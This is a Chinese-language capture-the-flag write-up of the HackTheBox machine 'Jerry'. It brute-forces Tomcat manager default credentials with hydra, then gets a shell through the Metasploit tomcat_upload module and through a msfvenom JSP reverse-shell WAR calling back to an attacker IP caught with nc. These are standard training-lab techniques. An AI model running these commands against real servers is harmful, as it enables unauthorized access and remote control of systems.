---
title: Jerry
date: 2021-12-24 11:29:39
tags: HackThebox
categories: 中间件
---

## 靶机信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/d5f1dc82530e485e91e914d59c62f9ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 信息收集

我们可以看到，目标主机只开放了8080端口，而且版本还是`7.0.88`的
![在这里插入图片描述](https://img-blog.csdnimg.cn/12b2a2ded3544b248ce0ae24e4c30139.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

我们立马登录tomcat页面，并且尝试账户和密码都是admin，看看能不能登录成功，结果是失败的。
![在这里插入图片描述](https://img-blog.csdnimg.cn/14569a31b1e04d76855654582e15e833.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a1c59a404d30477d9434d5ca81214227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 漏洞利用

我们下载`seclists`这个工具，对tomcat的默认用户名和密码进行暴力破解
![在这里插入图片描述](https://img-blog.csdnimg.cn/4573275f27314e41997be90a187c528b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

我们使用hydra工具对账号密码进行破解，发现账号是tomcat，密码是s3cret

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2e489a5e1395436f87bbc2c1c05db04b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

### MSF获取权限

```bash
search tomcat_mgr
use exploit/multi/http/tomcat_upload
show options
set rhosts 10.10.10.95
set lhost 10.10.14.11
set httpusername tomcat
set httppassword s3cret
set rport 8080
exploit
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/405b1654a30e4fd8b5ff405938d24a51.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们获取一个shell，发现已经是最高权限了
![在这里插入图片描述](https://img-blog.csdnimg.cn/efd9843d30e5431cbe6ae1408fbcb011.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那么我们就可以查看到flag值了
![在这里插入图片描述](https://img-blog.csdnimg.cn/89ecac8618f24fdf9edd6cf96a419036.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

### NC反弹shell

首先我们先准备一个木马

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=1234 -f war > shell.war
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/c4abdde92c484b46ac8782a2c62da4fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们使用账号密码登录进部署页面，并将生成的木马部署进tomcat服务器上
![在这里插入图片描述](https://img-blog.csdnimg.cn/9dd05049c33f45cf971a5f70a9a6d2e8.png)
然后我们启动nc进行监听，并且在浏览器上浏览我们刚刚上传的war包，反弹shell成功。
![在这里插入图片描述](https://img-blog.csdnimg.cn/fbcd897e89c149549ead8a54352163ae.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/488c679d14e64be28972f71dab63504a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
